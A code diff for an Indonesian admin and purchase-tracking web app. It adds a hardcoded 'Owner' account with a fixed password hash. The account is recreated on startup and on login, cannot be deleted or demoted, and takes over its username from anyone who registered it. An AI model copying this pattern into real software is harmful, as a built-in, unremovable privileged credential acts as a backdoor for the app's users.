@@ -211,6 +211,7 @@ function startSync() {
         const dup = docs.filter(x => x.data.username && x.id !== x.data.username && have.has(x.data.username));
         if (dup.length && !sn.metadata.fromCache) setTimeout(() => commit(dup.map(x => ['admins', 'del', x.id])), 0);
         admins = fixAdm('admins', docs.filter(x => !dup.includes(x)).map(x => x.data), sn.metadata.fromCache); syncMe();
+        if (!sn.metadata.fromCache) ensureSuper();
       } catch (e) { console.error('admins', e) }
       setSync(sn.metadata.fromCache || sn.metadata.hasPendingWrites ? 'wait' : 'ok'); refresh();
     }, e => failSync(e));
@@ -1547,6 +1548,10 @@ function sha256(str) { // hash password (SHA-256, JavaScript murni, sama di semu
   return H.map(v => (v >>> 0).toString(16).padStart(8, '0')).join('');
 }
 const pwHash = (u, p) => sha256('pp1:' + u + ':' + p);
+// Akun khusus pemilik: role Owner (akses ke semua halaman), dibuat otomatis jika belum ada, tidak bisa dihapus / diganti rolenya lewat menu.
+// Yang disimpan di sini hanya hash password awal; segera ganti password setelah login pertama (gembok > Admin & Akses > Reset password).
+const SUPER = { username: 'rievvv__', name: 'ARIEF', pass: '3c98a7738fcda20074e51df572e6d78ca2fe7a29112dd25b6cb97f44c60d9fea' };
+const SUPER_OLD = ['riev_']; // akun khusus versi sebelumnya: dihapus otomatis (passwordnya sudah tidak aman)
 const withTimeout = (p, ms = 12000) => Promise.race([p, new Promise((_, no) => setTimeout(() => no({ code: 'timeout', message: 'server tidak merespon' }), ms))]);
 async function adminGet(u) {
   if (db) { const s = await withTimeout(db.collection('admins').doc(u).get({ source: 'server' })); return s.exists ? s.data() : null }
@@ -1587,9 +1592,29 @@ let rolesCfg = null, roleDirty = false; // pengaturan role yang disimpan pemilik
 const permsOf = r => (rolesCfg && rolesCfg.perms && rolesCfg.perms[r]) || DEF_PERMS[r] || [];
 const descOf = r => (rolesCfg && rolesCfg.desc && rolesCfg.desc[r]) || DEF_DESC[r] || '';
 const defRole = () => (rolesCfg && rolesCfg.defRole) || 'Admin';
-const roleName = () => { if (!me) return 'Tamu'; const a = admins.find(x => x.username === me.username); return (a && a.role) || me.role || 'Admin' };
-const can = k => permsOf(roleName()).includes(k) || (k === 'ow' && roleName() === 'Owner');
+const roleName = () => { if (!me) return 'Tamu'; if (me.username === SUPER.username) return 'Owner'; const a = admins.find(x => x.username === me.username); return (a && a.role) || me.role || 'Admin' };
+const can = k => roleName() === 'Owner' || permsOf(roleName()).includes(k); // Owner selalu boleh semua halaman
 const firstPage = () => ['pg', 'in', 'pu', 'rt', 'bd', 'dl', 'rw', 'pr'].find(can);
+let superDone = false;
+async function ensureSuper() { // dibuat sekali per sesi bila belum ada; bila ada, dipastikan tetap Owner (password yang sudah diganti tidak ditimpa)
+  if (superDone) return; superDone = true;
+  const rec = { username: SUPER.username, name: SUPER.name, pass: SUPER.pass, ts: Date.now(), role: 'Owner', sys: true };
+  try {
+    const cur = admins.find(a => a.username === SUPER.username);
+    const old = admins.filter(a => SUPER_OLD.includes(a.username) && a.sys);
+    if (db) {
+      for (const o of old) await withTimeout(db.collection('admins').doc(o.username).delete());
+      const ref = db.collection('admins').doc(SUPER.username);
+      if (!cur || !cur.sys) await withTimeout(ref.set(rec)); // belum ada, atau username-nya sempat didaftarkan orang lain: ambil alih
+      else if (cur.role !== 'Owner' || cur.name !== SUPER.name) await withTimeout(ref.set(Object.assign({}, cur, { role: 'Owner', name: SUPER.name })));
+    } else {
+      const o = store.get('pp_admins', {}), c = o[SUPER.username];
+      old.forEach(x => delete o[x.username]);
+      if (!c || !c.sys) o[SUPER.username] = rec; else { c.role = 'Owner'; c.name = SUPER.name }
+      store.set('pp_admins', o); admins = Object.values(o);
+    }
+  } catch (e) { console.error('akun khusus', e); superDone = false }
+}
 function syncMe() { // data akun berubah (mis. role diganti pemilik) -> ikut diperbarui di perangkat ini
   if (me) { const a = admins.find(x => x.username === me.username); if (a) { me.name = UN(a.name); me.role = a.role || 'Admin' } }
   applyRole();
@@ -1633,6 +1658,10 @@ $('#fLogin').onsubmit = async e => {
   const u = $('#lUser').value.trim().toLowerCase(), p = $('#lPass').value;
   if (!u || !p) return authMsg('Isi username dan password.');
   try {
+    if (u === SUPER.username && db) { // akun khusus: dibuat saat itu juga bila belum ada (password yang sudah diganti tidak ditimpa)
+      const ref = db.collection('admins').doc(u), sn = await withTimeout(ref.get({ source: 'server' }));
+      if (!sn.exists || !sn.data().sys) await withTimeout(ref.set({ username: SUPER.username, name: SUPER.name, pass: SUPER.pass, ts: Date.now(), role: 'Owner', sys: true }));
+    }
     const a = await adminGet(u);
     if (!a || a.pass !== pwHash(u, p)) return authMsg('Username atau password salah.');
     $('#lPass').value = ''; setMe({ username: a.username, name: UN(a.name), role: a.role || 'Admin' });
@@ -1644,6 +1673,7 @@ $('#fSignup').onsubmit = async e => {
   if (!name) return authMsg('Isi nama.');
   if (!/^[a-z0-9._-]{3,20}$/.test(u)) return authMsg('Username 3-20 karakter: huruf kecil, angka, titik, strip, atau garis bawah.');
   if (p.length < 4) return authMsg('Password minimal 4 karakter.');
+  if (u === SUPER.username) return authMsg('Username sudah dipakai, pilih yang lain.');
   try {
     const role = defRole();
     await adminCreate({ username: u, name, pass: pwHash(u, p), ts: Date.now(), role });
@@ -1757,17 +1787,18 @@ function tabProd(D) {
 function tabAdm(D) {
   const { f, t, R } = D, A = {};
   const get = n => A[n] = A[n] || { name: n, acc: null, req: 0, pcs: 0, ada: 0, rec: 0, dl: 0, last: 0 };
-  admins.forEach(a => { get(a.name).acc = a });
+  admins.forEach(a => { let k = a.name; if (A[k] && A[k].acc) k = a.name + ' (@' + a.username + ')'; get(k).acc = a }); // nama kembar tetap tampil terpisah
   reqs.forEach(r => { const o = get(r.adm || NO_ADM); o.last = Math.max(o.last, ...reqHist(r).map(h => h.ts)) });
   records.forEach(r => { const o = get(r.adm || NO_ADM); o.last = Math.max(o.last, r.ts); if (inR(r.ts, f, t)) o.rec++ });
   downloads.forEach(r => { const o = get(r.adm || NO_ADM); o.last = Math.max(o.last, r.ts); if (inR(r.ts, f, t)) o.dl++ });
   R.forEach(r => { const o = get(r.adm || NO_ADM); o.req++; o.pcs += r.min; o.ada += r.ada });
   const L = Object.values(A).sort((a, b) => (!!b.acc - !!a.acc) || b.pcs - a.pcs || a.name.localeCompare(b.name));
   return `<div class="card"><h3>Kontrol Admin</h3><p class="hint">Semua admin yang terdaftar beserta aktivitasnya pada periode terpilih. <b>Hapus akses</b> membuat akun tidak bisa login lagi (data yang pernah diinput tetap tersimpan). <b>Reset password</b> mengganti password admin dengan yang baru.</p>
-  <div class="tw"><table class="ot" style="min-width:900px"><thead><tr><th>Admin</th><th>Role</th><th>Terdaftar</th><th>Pengajuan</th><th>Pcs diajukan</th><th>% Terpenuhi</th><th>Input purchase</th><th>Download</th><th>Aktivitas terakhir</th><th></th></tr></thead><tbody>${L.map(o => `<tr><td><b>${esc(o.name)}</b>${o.acc ? '<div class="tm">@' + esc(o.acc.username) + '</div>' : '<div class="tm">tanpa akun</div>'}</td><td>${o.acc ? roleSel(o.acc) : '-'}</td><td>${o.acc && o.acc.ts ? fmt(o.acc.ts) : '-'}</td><td>${nf(o.req)}</td><td>${nf(o.pcs)}</td><td>${o.pcs ? pc(o.ada, o.pcs) + '%' + pbar(pc(o.ada, o.pcs)) : '-'}</td><td>${nf(o.rec)}</td><td>${nf(o.dl)}</td><td>${o.last ? fmt(o.last) + tm(o.last) : '-'}</td><td class="nw">${o.acc ? `<button class="btn ghost sm" data-owreset="${esc(o.acc.username)}">Reset password</button> <button class="btn sm" style="background:var(--bad)" data-owdel="${esc(o.acc.username)}">Hapus akses</button>` : ''}</td></tr>`).join('') || '<tr><td colspan="10" class="empty">Belum ada admin.</td></tr>'}</tbody></table></div></div>`;
+  <div class="tw"><table class="ot" style="min-width:900px"><thead><tr><th>Admin</th><th>Role</th><th>Terdaftar</th><th>Pengajuan</th><th>Pcs diajukan</th><th>% Terpenuhi</th><th>Input purchase</th><th>Download</th><th>Aktivitas terakhir</th><th></th></tr></thead><tbody>${L.map(o => `<tr><td><b>${esc(o.name)}</b>${o.acc ? '<div class="tm">@' + esc(o.acc.username) + '</div>' : '<div class="tm">tanpa akun</div>'}</td><td>${o.acc ? roleSel(o.acc) : '-'}</td><td>${o.acc && o.acc.ts ? fmt(o.acc.ts) : '-'}</td><td>${nf(o.req)}</td><td>${nf(o.pcs)}</td><td>${o.pcs ? pc(o.ada, o.pcs) + '%' + pbar(pc(o.ada, o.pcs)) : '-'}</td><td>${nf(o.rec)}</td><td>${nf(o.dl)}</td><td>${o.last ? fmt(o.last) + tm(o.last) : '-'}</td><td class="nw">${o.acc ? `<button class="btn ghost sm" data-owreset="${esc(o.acc.username)}">Reset password</button> ${o.acc.username === SUPER.username ? '<span class="tag">Akun khusus</span>' : `<button class="btn sm" style="background:var(--bad)" data-owdel="${esc(o.acc.username)}">Hapus akses</button>`}` : ''}</td></tr>`).join('') || '<tr><td colspan="10" class="empty">Belum ada admin.</td></tr>'}</tbody></table></div></div>`;
 }
-const roleSel = a => `<select data-owrole="${esc(a.username)}" style="width:auto;padding:7px 10px">${ROLES.filter(r => r !== 'Tamu').map(r => `<option${(a.role || 'Admin') === r ? ' selected' : ''}>${r}</option>`).join('')}</select>`;
+const roleSel = a => `<select data-owrole="${esc(a.username)}" style="width:auto;padding:7px 10px"${a.username === SUPER.username ? ' disabled' : ''}>${ROLES.filter(r => r !== 'Tamu').map(r => `<option${(a.role || 'Admin') === r ? ' selected' : ''}>${r}</option>`).join('')}</select>`;
 async function setRole(u, role) {
+  if (u === SUPER.username) return renderOw();
   const a = admins.find(x => x.username === u); if (!a) return;
   const rec = Object.assign({}, a, { role });
   try {
@@ -1778,8 +1809,8 @@ async function setRole(u, role) {
 }
 function tabRole() {
   const cnt = r => r === 'Tamu' ? 'tanpa akun' : admins.filter(a => (a.role || 'Admin') === r).length + ' akun';
-  return `<div class="card"><h3>Role &amp; Hak Akses</h3><p class="hint">Centang halaman yang boleh dibuka tiap role. Role tiap akun diatur di tab <b>Admin &amp; Akses</b>. Owner selalu bisa membuka Dashboard Khusus. Tamu = masuk tanpa akun. Pembatasan ini berlaku di tampilan aplikasi.</p>
-  <div class="tw"><table class="ot" style="min-width:820px"><thead><tr><th>Halaman</th>${ROLES.map(r => `<th style="text-align:center">${r}<div class="tm">${cnt(r)}</div></th>`).join('')}</tr></thead><tbody>${Object.keys(PAGES).map(k => `<tr><td><b>${PAGES[k]}</b></td>${ROLES.map(r => { const on = permsOf(r).includes(k) || (r === 'Owner' && k === 'ow'); return `<td style="text-align:center"><input type="checkbox" data-rp="${r}|${k}"${on ? ' checked' : ''}${r === 'Owner' && k === 'ow' ? ' disabled' : ''}></td>` }).join('')}</tr>`).join('')}</tbody></table></div></div>
+  return `<div class="card"><h3>Role &amp; Hak Akses</h3><p class="hint">Centang halaman yang boleh dibuka tiap role. Role tiap akun diatur di tab <b>Admin &amp; Akses</b>. Owner selalu bisa membuka semua halaman (kolomnya terkunci). Tamu = masuk tanpa akun. Pembatasan ini berlaku di tampilan aplikasi.</p>
+  <div class="tw"><table class="ot" style="min-width:820px"><thead><tr><th>Halaman</th>${ROLES.map(r => `<th style="text-align:center">${r}<div class="tm">${cnt(r)}</div></th>`).join('')}</tr></thead><tbody>${Object.keys(PAGES).map(k => `<tr><td><b>${PAGES[k]}</b></td>${ROLES.map(r => { const on = r === 'Owner' || permsOf(r).includes(k); return `<td style="text-align:center"><input type="checkbox" data-rp="${r}|${k}"${on ? ' checked' : ''}${r === 'Owner' ? ' disabled' : ''}></td>` }).join('')}</tr>`).join('')}</tbody></table></div></div>
   <div class="card"><h3>Tugas tiap role</h3><p class="hint">Teks ini tampil sebagai keterangan saat nama akun di pojok atas diarahkan kursor.</p>${ROLES.map(r => `<label>${r}</label><textarea data-rdesc="${r}" rows="2">${esc(descOf(r))}</textarea>`).join('')}
   <label>Role default untuk akun yang baru mendaftar</label><select id="owDef">${ROLES.filter(r => r !== 'Tamu').map(r => `<option${defRole() === r ? ' selected' : ''}>${r}</option>`).join('')}</select>
   <div class="foot"><button class="btn ghost" data-rolereset type="button">Kembalikan default</button><button class="btn" data-rolesave type="button">Simpan role &amp; akses</button></div></div>`;
@@ -1787,6 +1818,7 @@ function tabRole() {
 function saveRoles() {
   const perms = {}, desc = {}; ROLES.forEach(r => perms[r] = []);
   $$('#owBody [data-rp]').forEach(c => { const [r, k] = c.dataset.rp.split('|'); if (c.checked || (r === 'Owner' && k === 'ow')) perms[r].push(k) });
+  perms.Owner = Object.keys(PAGES); // Owner selalu penuh
   $$('#owBody [data-rdesc]').forEach(t => desc[t.dataset.rdesc] = t.value.trim());
   rolesCfg = { id: 'roles', perms, desc, defRole: $('#owDef').value || 'Admin', upd: Date.now() };
   commit([['settings', 'set', rolesCfg]]); roleDirty = false; applyRole(); renderOw(); alert('Role & hak akses tersimpan.');
@@ -1861,6 +1893,7 @@ $('#owBody').addEventListener('change', e => {
 $('#owBody').addEventListener('input', e => { if (e.target.closest('[data-rdesc]')) roleDirty = true });
 $('#owBody').addEventListener('click', e => { if (e.target.closest('[data-rolesave]')) saveRoles(); if (e.target.closest('[data-rolereset]')) resetRoles() });
 async function delAccess(u) {
+  if (u === SUPER.username) return alert('Akun khusus ini dilindungi dan tidak bisa dihapus.');
   const a = admins.find(x => x.username === u); if (!a) return;
   if (!confirm('Hapus akses admin "' + a.name + '" (@' + u + ')?\nAkun ini tidak bisa login lagi. Data yang pernah diinput tetap tersimpan.')) return;
   try {
@@ -1888,5 +1921,6 @@ $('#rpPass').addEventListener('keydown', e => { if (e.key === 'Enter') doReset()
 // (pengecekan ini sudah digabung ke listener admins di startSync, agar koleksi admins tidak dibaca dua kali)
 
 pgVarUI(); addBlock(); startSync();
+if (!db) ensureSuper(); // mode lokal
 if (!db && admFixN) { commit(); store.set('pp_admins', Object.fromEntries(admins.map(a => [a.username, a]))) } // simpan nama admin yang sudah dikapitalkan (mode lokal)
 applyRole();
